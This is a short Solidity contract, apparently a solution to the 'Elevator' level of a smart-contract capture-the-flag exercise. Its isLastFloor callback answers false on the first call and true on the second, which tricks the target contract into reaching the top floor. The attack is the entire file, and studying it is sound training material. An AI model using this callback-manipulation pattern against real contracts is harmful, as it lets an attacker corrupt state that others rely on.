// SPDX-License-Identifier: GPL-3.0

pragma solidity ^0.6.0;

import "./11_Elevator.sol";

contract ElevatorAttack {
    bool public firstCall = true;

    function attack(Elevator target) external {
        target.goTo(1);
    }

    function isLastFloor(uint256 floor) external returns (bool) {
        if (firstCall) {
            firstCall = false;
            return false;
        } else {
            return true;
        }
    }
}
